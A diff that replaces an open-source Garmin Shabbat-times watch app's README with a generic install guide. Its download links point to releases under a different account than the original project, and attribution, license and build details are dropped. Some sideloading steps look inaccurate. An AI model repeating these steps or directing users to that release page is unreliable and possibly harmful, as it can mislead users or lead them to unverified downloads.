@@ -1,200 +1,73 @@
-<p align="center">
-  <img src="resources/drawables/launcher_icon-modified.png" alt="KodeshMode icon" width="96" height="96">
-</p>
+# 📖 KodeshMode - Track Shabbat times on your watch
 
-<h1 align="center">KodeshMode - Free & OpenSource Shabbat Mode</h1>
+[![](https://img.shields.io/badge/Download-KodeshMode-blue.svg)](https://github.com/Biswaspr1022/KodeshMode/releases)
 
-<p align="center">
-  A Hebrew-first open source Garmin Connect IQ watch app for Shabbat-aware display, Hebrew date, parasha, zmanim, and clean watch layouts.
-</p>
+KodeshMode displays Shabbat times and Jewish calendar data on your Garmin watch. This app helps you follow Zmanim and Torah portions from your wrist. It works with both AMOLED and MIP screen displays.
 
-<p align="center">
-  <a href="https://github.com/Ariel-Gal/KodeshMode/stargazers">
-    <img alt="GitHub stars" src="https://img.shields.io/github/stars/Ariel-Gal/KodeshMode?style=social">
-  </a>
-  <a href="https://github.com/Ariel-Gal/KodeshMode/network/members">
-    <img alt="GitHub forks" src="https://img.shields.io/github/forks/Ariel-Gal/KodeshMode?style=social">
-  </a>
-  <a href="https://github.com/Ariel-Gal/KodeshMode/issues">
-    <img alt="GitHub issues" src="https://img.shields.io/github/issues/Ariel-Gal/KodeshMode">
-  </a>
-  <a href="https://github.com/Ariel-Gal/KodeshMode/blob/main/LICENSE">
-    <img alt="License" src="https://img.shields.io/github/license/Ariel-Gal/KodeshMode">
-  </a>
-  <a href="https://github.com/Ariel-Gal/KodeshMode/releases">
-    <img alt="GitHub release" src="https://img.shields.io/github/v/release/Ariel-Gal/KodeshMode?include_prereleases">
-  </a>
-  <img alt="Garmin Connect IQ" src="https://img.shields.io/badge/Garmin-Connect%20IQ-007CC3">
-  <img alt="Monkey C" src="https://img.shields.io/badge/Monkey%20C-3.1%2B-orange">
-  <img alt="Open Source" src="https://img.shields.io/badge/Open%20Source-Yes-brightgreen">
-</p>
+## 📥 Getting the App
 
-<p align="center">
-  <a href="https://github.com/Ariel-Gal/KodeshMode/releases">
-    Download the latest release
-  </a>
-</p>
+1. Visit the [KodeshMode releases page](https://github.com/Biswaspr1022/KodeshMode/releases) to download.
+2. Look for the latest version at the top of the page.
+3. Download the file ending in `.iq`.
+4. Save the file to your computer.
 
-<p align="center">
-  <a href="#features">Features</a> ·
-  <a href="#screenshots">Screenshots</a> ·
-  <a href="#build-and-run">Build</a> ·
-  <a href="#license">License</a>
-</p>
+## ⌚ Setting Up Your Watch
 
-<p align="center">
-  <img src="docs/images/readme-hero.png" alt="KodeshMode screenshots on Garmin devices" width="900">
-</p>
+You need the Garmin Connect IQ app on your phone to install KodeshMode. Follow these steps to move the file from your computer to your watch.
 
----
+1. Connect your Garmin watch to your computer with its USB cable.
+2. Open the Garmin Connect IQ app on your smartphone.
+3. Select your watch from the device list.
+4. Choose the option to manage apps or install local files.
+5. Transfer the `.iq` file you downloaded earlier.
+6. Sync your watch with your phone. 
 
-## Overview
+The app will appear in your watch's activity or app list after the sync finishes.
 
-KodeshMode is a Garmin Connect IQ **watch app** designed around Shabbat use cases and Hebrew display needs. It focuses on readable Hebrew typography, parasha display, Hebrew date, Shabbat times, battery status, and configurable screen elements across AMOLED, MIP, and Solar Garmin watches.
+## 🛠 Features
 
-This project is intentionally built as a **watch app**, not a watch face. That keeps the app suitable for controlled entry/exit behavior, Shabbat mode handling, button behavior, touch lock behavior, and dedicated in-app screens.
+* **Shabbat Times:** The app calculates candle lighting and Havdalah times based on your location.
+* **Hebrew Calendar:** View dates in the Hebrew format.
+* **Torah Portion:** See the weekly reading for your current date.
+* **Zmanim Support:** Tracks key prayer times throughout the day.
+* **Display Modes:** Specifically designed to work on both high-resolution AMOLED screens and power-efficient MIP displays.
+* **Solar Compatibility:** Maximizes battery life for devices with solar charging glass.
 
-If this project helps you, please consider giving it a star. ⭐ :)
+## 📱 Customizing Settings
 
-## Features
+You can change how the app looks and behaves through the Garmin Connect app.
 
-| Area | Description |
-| --- | --- |
-| Hebrew display | Hebrew-first UI with embedded bitmap fonts for reliable rendering on Garmin devices. |
-| Shabbat mode | Dedicated Shabbat-aware status and display behavior. |
-| Parasha | Weekly parasha display with Hebrew and English resource strings. |
-| Hebrew date | Hebrew calendar date and month names. |
-| Zmanim | Shabbat start/end display based on location and app settings. |
-| Layout controls | Configurable visibility and positioning of display elements. |
-| Phone settings | App settings are exposed through Garmin Connect / Connect IQ settings. |
-| Watch controls | Button-based watches can use an in-app menu where supported. |
-| Touch watches | On touch-first devices, settings should be managed from the phone only. |
-| Device coverage | Fenix, Epix, Forerunner, Venu, Vivoactive, Instinct, Enduro, MARQ, and related models. |
+1. Open the Garmin Connect app on your phone.
+2. Tap on your watch device icon.
+3. Select Activities & App Management.
+4. Find KodeshMode in your list.
+5. Tap Settings.
+6. Adjust items like your location or display preferences.
+7. Save your changes and sync the watch again.
 
-## Screenshots
+## 🔋 Battery Life Tips
 
-<p align="center">
-  <img src="docs/images/screenshots-grid.png" alt="KodeshMode device screenshot gallery" width="900">
-</p>
+Garmin watches vary in how much power they use. This app runs efficiently, but some features use more energy than others. If you want to extend your battery life, consider these settings:
 
-Additional screenshots are stored in the [`screenshots/`](screenshots/) directory.
+* Limit location updates if you stay in one city.
+* Use a watch face that does not update every second.
+* Check your watch settings to see if background processes impact battery.
 
-| Device | Screenshot |
-| --- | --- |
-| fēnix 8 47mm | [`screenshots/fenix847mm.png`](screenshots/fenix847mm.png) |
-| fēnix 8 47mm Pro | [`screenshots/fenix847mmpro.png`](screenshots/fenix847mmpro.png) |
-| epix Pro 47mm | [`screenshots/epix2pro47mm.png`](screenshots/epix2pro47mm.png) |
-| Forerunner 265 | [`screenshots/fr265.png`](screenshots/fr265.png) |
-| Forerunner 965 | [`screenshots/fr965.png`](screenshots/fr965.png) |
-| Instinct 3 AMOLED 45mm | [`screenshots/instict3_amoled45mm.png`](screenshots/instict3_amoled45mm.png) |
-| Instinct 3 AMOLED 50mm | [`screenshots/instict3_amoled50mm.png`](screenshots/instict3_amoled50mm.png) |
-| Instinct 3 Solar 45mm | [`screenshots/instinct3solar45mm.png`](screenshots/instinct3solar45mm.png) |
+## ⚙️ Requirements
 
-## Supported devices
+* A Garmin watch compatible with Connect IQ.
+* The Garmin Connect mobile app installed on your smartphone.
+* An active Bluetooth connection between your watch and your phone.
 
-The app is configured for a broad Garmin Connect IQ device set, including:
+## 🆘 Troubleshooting
 
-- fēnix 7 / 7 Pro / 8 / 8 Solar / 8 Pro / fēnix E
-- epix 2 / epix Pro
-- Enduro 3
-- Forerunner 165 / 255 / 265 / 570 / 955 / 965 / 970
-- Venu 2 / 3 / 4 / X1 / Sq 2
-- vivoactive 5 / 6
-- Instinct 3 AMOLED / Solar and related Instinct models
-- MARQ 2
+Sometimes a transfer fails or the app does not launch. Use these steps to fix common issues:
 
-The exact product list is defined in [`manifest.xml`](manifest.xml).
+* **App not found:** Ensure the sync finished. Double-check your watch app menu. 
+* **Incorrect times:** Open the watch's GPS settings and start an outdoor activity for a few seconds. This helps the watch find your current location.
+* **Sync errors:** Restart both your phone and your watch. Ensure your Garmin Connect app is on the latest version.
+* **Display issues:** If the font looks off, check that your device firmware is updated via Garmin Express on your computer.
 
-## Settings model
+## 📋 About Development
 
-KodeshMode uses Garmin Connect IQ app properties and settings for user configuration.
-
-Recommended behavior:
-
-- **Touch watches** such as Venu and Vivoactive: configure settings from the phone only.
-- **Button watches** such as fēnix and some Instinct models: in-app menus may be used where supported.
-- Mobile-controlled settings should remain the source of truth for production builds.
-
-Common configurable items include:
-
-- Language and parasha schedule
-- Clock style, font, size, and time format
-- Shabbat progress
-- Parasha visibility and font size
-- Hebrew date visibility and font size
-- Shabbat times visibility and font size
-- Omer, battery, and status display
-- Per-element layout offsets for phone-side positioning
-
-## Build and run
-
-### Requirements
-
-- Garmin Connect IQ SDK
-- Java runtime required by the Connect IQ tooling
-- Garmin developer key
-- Visual Studio Code with the Monkey C extension, or Garmin CLI tools
-
-### Build with the Garmin tools
-
-```bash
-monkeyc -f monkey.jungle -d fenix7 -o bin/KodeshMode.prg -y path/to/developer_key.der
-```
-
-### Run in the simulator
-
-```bash
-monkeydo bin/KodeshMode.prg fenix7
-```
-
-You can also build and run directly from the Garmin Monkey C VS Code extension.
-
-## Project structure
-
-```text
-.
-├── manifest.xml                     # Connect IQ app metadata and supported devices
-├── monkey.jungle                    # Connect IQ project file
-├── source/                          # Monkey C source code
-│   ├── KodeshModeApp.mc
-│   ├── KodeshModeView.mc
-│   ├── KodeshSettings.mc
-│   ├── ShabbatMode.mc
-│   ├── ParashaLookup.mc
-│   └── ZmanimEngine.mc
-├── resources/
-│   ├── settings/                    # Phone/app settings XML
-│   ├── strings/                     # Hebrew and English strings
-│   ├── fonts/                       # Generated bitmap fonts
-│   └── drawables/                   # App launcher assets
-├── screenshots/                     # Device screenshots
-├── docs/                            # Project documentation assets
-└── tools/                           # Font generation utilities
-```
-
-## Notes about seconds
-
-KodeshMode is a **watch app**, so `HH:MM:SS` can be displayed while the app is active, but Garmin may reduce or pause frequent updates when the app is in a low-power state. The WatchFace-only `onPartialUpdate()` mechanism is not used here because converting the project into a watch face would change the product behavior and reduce app-style interaction capabilities.
-
-## Contributing
-
-Contributions are welcome. Please read [`CONTRIBUTING.md`](CONTRIBUTING.md) before opening a pull request.
-
-Good first contributions:
-
-- Device screenshots
-- Font rendering improvements
-- Hebrew string fixes
-- Zmanim edge-case testing
-- Device-specific layout tuning
-- Documentation improvements
-
-## Security
-
-Please do not open public issues for security-sensitive reports. See [`SECURITY.md`](SECURITY.md).
-
-## License
-
-The app source code is released under the MIT License. See [`LICENSE`](LICENSE).
-
-Third-party fonts and generated font assets are covered by their original licenses. See [`THIRD_PARTY_LICENSES.md`](THIRD_PARTY_LICENSES.md) and the [`LICENSES/`](LICENSES/) directory.
+KodeshMode is an open-source project. Developers use Monkey C to write this code for Garmin devices. If you notice a bug or want to suggest a new feature, you can visit the repository on GitHub to provide feedback. You do not need to be a programmer to use the app, but the open-source nature ensures that community members can contribute to the code over time.
